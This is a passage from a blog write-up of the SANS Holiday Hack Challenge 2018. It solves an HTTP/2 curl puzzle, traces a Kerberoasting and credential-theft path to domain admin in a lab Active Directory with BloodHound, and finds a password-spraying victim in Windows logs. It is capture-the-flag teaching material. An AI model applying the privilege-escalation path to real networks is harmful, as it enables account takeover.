&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@44672f31f7a9:/etc/nginx$&lt;/span&gt; curl --http2-prior-knowledge http://localhost:8080/
&lt;span class="go"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt; &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;  &amp;lt;title&amp;gt;Candy Striper Turner-On&amp;#39;er&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt; &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt; &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt; &amp;lt;p&amp;gt;To turn the machine on, simply POST to this URL with parameter &amp;quot;status=on&amp;quot;&lt;/span&gt;

&lt;span class="go"&gt; &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Wow, it worked. I couldn't believe it. Let's take a closer look at what this
options does:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table class="docutils option-list" frame="void" rules="none"&gt;
&lt;col class="option" /&gt;
&lt;col class="description" /&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td class="option-group" colspan="2"&gt;
&lt;kbd&gt;&lt;span class="option"&gt;--http2-prior-knowledge&lt;/span&gt;&lt;/kbd&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;(HTTP) Tells curl to issue its non-TLS HTTP requests using HTTP/2 without HTTP/1.1 Upgrade. It requires prior knowledge that the server supports HTTP/2 straight  away.  HTTPS  requests
will still do HTTP/2 the standard way with negotiated protocol version in the TLS handshake.&lt;/td&gt;&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;Apparently, it's used when you know that the server is using HTTP/2, and you
contact it in plain text, and you don't want to rely on the HTTP/1.1 to HTTP/2
upgrade. This is exactly our use-case. Anyway, the server tells us to perform
a &lt;code&gt;POST&lt;/code&gt; request, with &lt;code&gt;status=on&lt;/code&gt;. This can be done with
&lt;code&gt;curl&lt;/code&gt; with the &lt;code&gt;-d&lt;/code&gt; option:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@451e98e0a27c:~$&lt;/span&gt; curl --http2-prior-knowledge -d &lt;span class="s1"&gt;&amp;#39;status=on&amp;#39;&lt;/span&gt; http://localhost:8080/
&lt;span class="go"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt; &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;  &amp;lt;title&amp;gt;Candy Striper Turner-On&amp;#39;er&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt; &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt; &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt; &amp;lt;p&amp;gt;To turn the machine on, simply POST to this URL with parameter &amp;quot;status=on&amp;quot;&lt;/span&gt;

&lt;span class="go"&gt;                                                                okkd,&lt;/span&gt;
&lt;span class="go"&gt;                                                               OXXXXX,&lt;/span&gt;
&lt;span class="go"&gt;                                                              oXXXXXXo&lt;/span&gt;
&lt;span class="go"&gt;                                                             ;XXXXXXX;&lt;/span&gt;
&lt;span class="go"&gt;                                                            ;KXXXXXXx&lt;/span&gt;
&lt;span class="go"&gt;                                                           oXXXXXXXO&lt;/span&gt;
&lt;span class="go"&gt;                                                        .lKXXXXXXX0.&lt;/span&gt;
&lt;span class="go"&gt;  &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;       .&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;       .&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;       .:::;   &amp;#39;:okKXXXXXXXX0Oxcooddool,&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;MMMMMO&amp;#39;,,,,,;WMMMMM0&amp;#39;,,,,,;WMMMMMK&amp;#39;,,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;MMMMN;,,,,,&amp;#39;0MMMMMW;,,,,,&amp;#39;OMMMMMW:,,,,,&amp;#39;kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x.&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;MMMO&amp;#39;,,,,,;WMMMMMO&amp;#39;,,,,,,NMMMMMK&amp;#39;,,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX:&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;MMN,,,,,,&amp;#39;OMMMMMW;,,,,,&amp;#39;kMMMMMW;,,,,,&amp;#39;xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;M0&amp;#39;,,,,,;WMMMMM0&amp;#39;,,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.&lt;/span&gt;
&lt;span class="go"&gt; .c.......&amp;#39;cccccc.......&amp;#39;cccccc.......&amp;#39;cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc&lt;/span&gt;
&lt;span class="go"&gt;                                                    ;xKXXXXXXX0xKXXXXXXXXK.&lt;/span&gt;
&lt;span class="go"&gt;                                                       ..,:ccllc:cccccc:&amp;#39;&lt;/span&gt;

&lt;span class="go"&gt;Unencrypted 2.0? He&amp;#39;s such a silly guy.&lt;/span&gt;
&lt;span class="go"&gt;That&amp;#39;s the kind of stunt that makes my OWASP friends all cry.&lt;/span&gt;
&lt;span class="go"&gt;Truth be told: most major sites are speaking 2.0;&lt;/span&gt;
&lt;span class="go"&gt;TLS connections are in place when they do so.&lt;/span&gt;
&lt;span class="go"&gt;-Holly Evergreen&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;p&amp;gt;Congratulations! You&amp;#39;ve won and have successfully completed this challenge.&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;p&amp;gt;POSTing data in HTTP/2.0.&lt;/span&gt;
&lt;span class="go"&gt; &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And just like that, our candy striper started up!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="sans-slingshot-linux-image"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id22"&gt;SANS Slingshot Linux image&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We're supposed to take a look at the data set contained in this &lt;a class="reference external" href="https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova"&gt;Slinghost
LInux image&lt;/a&gt;
to find how to elevate our privileges on a Active Directory environment. Let's
fire up VirtualBox and start the VM. &lt;strong&gt;Make sure that you configure the VM to
run in 64 bits, or it won't boot&lt;/strong&gt; (I lost half an hour before figuring this
out).&lt;/p&gt;
&lt;p&gt;When the VM boots up, we get access to a Linux desktop, with a shortcut to the
&lt;code&gt;BloodHound&lt;/code&gt; tool.&lt;/p&gt;
&lt;img alt="slingshot_desktop.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_desktop.png" /&gt;
&lt;p&gt;&lt;a class="reference external" href="https://github.com/BloodHoundAD/BloodHound"&gt;This tool&lt;/a&gt;, created by the
&lt;a class="reference external" href="https://specterops.io/"&gt;Specter Ops&lt;/a&gt; team, can be used to easily find a
privilege escalation path from simple user to domain administrator:&lt;/p&gt;
&lt;img alt="slingshot_bloodhound_interface.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_bloodhound_interface.png" /&gt;
&lt;p&gt;We're asked to find a path from a Kerberoastable user to domain administrator
privileges. If you want more information on Kerberoasting, here are a few
resources:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf"&gt;Tim Medin: Attacking Kerberos: Kicking the Guard Dog of Hades&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Rob Fuller's &lt;a class="reference external" href="https://malicious.link/post/2016/kerberoast-pt1/"&gt;three&lt;/a&gt; &lt;a class="reference external" href="https://malicious.link/post/2016/kerberoast-pt2/"&gt;part&lt;/a&gt; &lt;a class="reference external" href="https://malicious.link/post/2016/kerberoast-pt3/"&gt;series&lt;/a&gt; on the topic.&lt;/li&gt;
&lt;li&gt;Will Schroeder's &lt;a class="reference external" href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/"&gt;detailed explanation&lt;/a&gt; of the attack and on how to perform it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Luckily, &lt;code&gt;BloodHound&lt;/code&gt; has a query to search such a path:&lt;/p&gt;
&lt;img alt="slingshot_bloodhound_kerberoast_query.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_bloodhound_kerberoast_query.png" /&gt;
&lt;p&gt;If we click on it, we get this result:&lt;/p&gt;
&lt;img alt="slingshot_kerberoast_result.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_kerberoast_result.png" /&gt;
&lt;p&gt;Now, we're told not to rely on RDP access to determine administrative access.
So let's focus on this part of the graph:&lt;/p&gt;
&lt;img alt="slingshot_kerberoast_result_details.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_kerberoast_result_details.png" /&gt;
&lt;p&gt;Here's the attack flow:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;code&gt;LDUBEJ00320&amp;#64;AD.KRINGLECASTLE.COM&lt;/code&gt; is a Kerberoastable user, so we can
recover their password (it it's weak enough).&lt;/li&gt;
&lt;li&gt;They're a member of the &lt;code&gt;IT_00332&lt;/code&gt; group. This group (and thus, so are
we) is local administrator on the &lt;code&gt;COMP00185&lt;/code&gt; computer.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;JBETAK00084&amp;#64;AD.KRINGLECASTLE.COM&lt;/code&gt; has a session on the
&lt;code&gt;COMP00185&lt;/code&gt; computer. Since we're local administrator on this machine,
we can recover &lt;code&gt;JBETAK00084&lt;/code&gt;'s password (for example, using
&lt;code&gt;mimikatz&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;JBETAK00084&lt;/code&gt; is a member of the domain administrator group. Since we
can get their password, we can elevate our privileges to domain administrator.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Therefore, the initial user we're looking for is
&lt;code&gt;LDUBEJ00320&amp;#64;AD.KRINGLECASTLE.COM&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="badge-manipulation"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id23"&gt;Badge Manipulation&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Things keep getting more tense:&lt;/p&gt;
&lt;img alt="toy_soldier_blue.png" class="align-center" src="/images/sans-christmas-challenge-2018/toy_soldier_blue.png" /&gt;
&lt;p&gt;&lt;em&gt;The toy soldiers say&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;The toy soldiers continue behaving very rudely, grunting orders to the
guests and to each other in vaguely Germanic phrases.&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Links.&lt;/p&gt;
&lt;p&gt;Nein! Nein! Nein!&lt;/p&gt;
&lt;p&gt;No one is coming to help you.&lt;/p&gt;
&lt;p&gt;Get the over here!&lt;/p&gt;
&lt;p&gt;Schnell!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Suddenly, one of the toy soldiers appears wearing a grey sweatshirt that
has written on it in red pen,&lt;/em&gt; &lt;a class="reference external" href="https://www.youtube.com/watch?v=DlQoXP2XH68"&gt;&amp;quot;NOW I HAVE A ZERO-DAY. HO-HO-HO.&amp;quot;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;A rumor spreads among the elves that Alabaster has lost his badge. Several
elves say, &amp;quot;What do you think someone could do with that?&amp;quot;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="section" id="pepper-minstix-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id24"&gt;Pepper Minstix' Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Apparently, someone's email account was compromised, and we have to analyze
logs to find out which one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;I am Pepper Minstix, and I&amp;#39;m looking for your help.&lt;/span&gt;
&lt;span class="go"&gt;Bad guys have us tangled up in pepperminty kelp!&lt;/span&gt;
&lt;span class="go"&gt;&amp;quot;Password spraying&amp;quot; is to blame for this our grinchly fate.&lt;/span&gt;
&lt;span class="go"&gt;Should we blame our password policies which users hate?&lt;/span&gt;

&lt;span class="go"&gt;Here you&amp;#39;ll find a web log filled with failure and success.&lt;/span&gt;
&lt;span class="go"&gt;One successful login there requires your redress.&lt;/span&gt;
&lt;span class="go"&gt;Can you help us figure out which user was attacked?&lt;/span&gt;
&lt;span class="go"&gt;Tell us who fell victim, and please handle this with tact...&lt;/span&gt;

&lt;span class="go"&gt;  Submit the compromised webmail username to&lt;/span&gt;
&lt;span class="go"&gt;  runtoanswer to complete this challenge.&lt;/span&gt;
&lt;span class="gp"&gt;elf@3c8eb61a4504:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's take a look at the file we have:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@3c8eb61a4504:~$&lt;/span&gt; ls -lh
&lt;span class="go"&gt;total 6.8M&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf 1.4K Dec 14 16:13 evtx_dump.py&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf 1.1M Dec 14 16:13 ho-ho-no.evtx&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 elf elf 5.7M Dec 14 16:13 runtoanswer&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, we have &lt;code&gt;runtoanswer&lt;/code&gt; — once we have found who was compromised —,
we have &lt;code&gt;ho-ho-no.evtx&lt;/code&gt; — which is a Windows log extract — and we have
a &lt;code&gt;evtx_dump.py&lt;/code&gt; Python script, which parses the &lt;code&gt;.evtx&lt;/code&gt;, and dump
the result in an XML format:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@3c8eb61a4504:~$&lt;/span&gt; python evtx_dump.py ho-ho-no.evtx
&lt;span class="go"&gt;&amp;lt;?xml version=&amp;quot;1.1&amp;quot; encoding=&amp;quot;utf-8&amp;quot; standalone=&amp;quot;yes&amp;quot; ?&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Events&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Event xmlns=&amp;quot;http://schemas.microsoft.com/win/2004/08/events/event&amp;quot;&amp;gt;&amp;lt;System&amp;gt;&amp;lt;Provider Name=&amp;quot;Mi&lt;/span&gt;
&lt;span class="go"&gt;crosoft-Windows-Security-Auditing&amp;quot; Guid=&amp;quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&amp;quot;&amp;gt;&amp;lt;/Provider&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;EventID Qualifiers=&amp;quot;&amp;quot;&amp;gt;4647&amp;lt;/EventID&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Version&amp;gt;0&amp;lt;/Version&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Level&amp;gt;0&amp;lt;/Level&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Task&amp;gt;12545&amp;lt;/Task&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Opcode&amp;gt;0&amp;lt;/Opcode&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Keywords&amp;gt;0x8020000000000000&amp;lt;/Keywords&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;TimeCreated SystemTime=&amp;quot;2018-09-10 12:18:26.972103&amp;quot;&amp;gt;&amp;lt;/TimeCreated&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;EventRecordID&amp;gt;231712&amp;lt;/EventRecordID&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Correlation ActivityID=&amp;quot;{fd18dc13-48f8-0001-58dc-18fdf848d401}&amp;quot; RelatedActivityID=&amp;quot;&amp;quot;&amp;gt;&amp;lt;/Correla&lt;/span&gt;
&lt;span class="go"&gt;tion&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Execution ProcessID=&amp;quot;660&amp;quot; ThreadID=&amp;quot;752&amp;quot;&amp;gt;&amp;lt;/Execution&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Channel&amp;gt;Security&amp;lt;/Channel&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Computer&amp;gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&amp;lt;/Computer&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Security UserID=&amp;quot;&amp;quot;&amp;gt;&amp;lt;/Security&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/System&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;EventData&amp;gt;&amp;lt;Data Name=&amp;quot;TargetUserSid&amp;quot;&amp;gt;S-1-5-21-25059752-1411454016-2901770228-500&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;Administrator&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Data Name=&amp;quot;TargetDomainName&amp;quot;&amp;gt;EM.KRINGLECON&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;Data Name=&amp;quot;TargetLogonId&amp;quot;&amp;gt;0x0000000000969b09&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/EventData&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/Event&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For ease of analysis, you can download the XML file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/ho-ho-no.xml"&gt;here&lt;/a&gt;.
We're told that the attack was a &lt;a class="reference external" href="https://www.triaxiomsecurity.com/2018/11/08/password-spraying-attack/"&gt;password spraying&lt;/a&gt;
attack. This means that an attacker chooses a well-known or very probable
password, such as &lt;code&gt;P&amp;#64;ssw0rd&lt;/code&gt;, or &lt;code&gt;Winter2018&lt;/code&gt;, and tries to
authenticate as every user with this password. This can be very efficient,
because it allows to find weak accounts, without risking blocking any account.&lt;/p&gt;
&lt;p&gt;If we look at the XML log file, we can see that the attacker tried to
authenticate as every user in alphabetical order, starting with
&lt;code&gt;aaron.smith&lt;/code&gt;, &lt;code&gt;abhishek.kumar&lt;/code&gt;, etc., all the way down to
&lt;code&gt;vinod.kumar&lt;/code&gt;, &lt;code&gt;wunorse.openslae&lt;/code&gt;. If the login didn't work, we
can see that the event has an attribute &lt;code&gt;&amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;&lt;/code&gt;.
Let's try some regex magic to find which user does not have such an attribute:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep -E &lt;span class="s1"&gt;&amp;#39;&amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;[a-z.]+&amp;lt;/Data&amp;gt;|&amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&amp;#39;&lt;/span&gt; ho-ho-no.xml &lt;span class="c1"&gt;# We only target users with lower-case username&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;sparkle.redberry&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;sparkle.redberry&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;sparkle.redberry&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;bushy.evergreen&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;bushy.evergreen&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;test.user&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;shinny.upatree&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;shinny.upatree&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;aaron.smith&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;abhishek.kumar&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;adam.smith&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            [snip]&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;mike.miller&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;mike.smith&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;mike.williams&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;minty.candycane&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;minty.candycane&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;mohamed.ahmed&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;mohamed.ali&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;TargetUserName&amp;quot;&amp;gt;muhammad.ali&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;            &amp;lt;Data Name=&amp;quot;FailureReason&amp;quot;&amp;gt;%%2313&amp;lt;/Data&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that &lt;code&gt;minty.candycane&lt;/code&gt; does not have a &lt;code&gt;FailureReason&lt;/code&gt;
after her login event. This means that the password spraying attack worked
against her account. She's the account we're looking for:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@230a1d67fee6:~$&lt;/span&gt; ./runtoanswer
&lt;span class="go"&gt;Loading, please wait......&lt;/span&gt;



&lt;span class="hll"&gt;&lt;span class="go"&gt;Whose account was successfully accessed by the attacker&amp;#39;s password spray? minty.candycane&lt;/span&gt;
&lt;/span&gt;

&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMMMMMM   NM   M   NMMMMMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMMMMMM             MMMMMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMW  KWMMNK       KWMMNK KMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMM       NMMM   MMM       WMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMW        K           NMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMN   MMMMMMMMMMMWK           KWMMMMMMMMMMM   WMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMWK MMM    MMMMMMMMMMMMMMM      NMMMMMMMMMMMMMMM   KMMWKKWMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMM   KMM    MMMMMMMMMMMMN KNM   MN  WMMMMMMMMMMMM   KMM    MMMMMM&lt;/span&gt;
&lt;span class="go"&gt;M        KMM    MMMMMMMMMMMM             MMMMMMMMMMMM   KMM         M&lt;/span&gt;
&lt;span class="go"&gt;MMN       MM    MMMMMMMMMMMMMN        KWMMMMMMMMMMMMM   KMM       NMM&lt;/span&gt;
&lt;span class="go"&gt;MW              MMN   MMMMMWMMMMW   MMMMWWMMMMW   WMM             KMM&lt;/span&gt;
&lt;span class="go"&gt;M     KWMN      NMK   MMMN     NM   M      MMM    NM       NMNK     M&lt;/span&gt;
&lt;span class="go"&gt;MMWWMMW               WMM                  WMM               NMMMNWMM&lt;/span&gt;
&lt;span class="go"&gt;MMMN        NMMW       NMK   N        KK   WM       KMMW        KWMMM&lt;/span&gt;
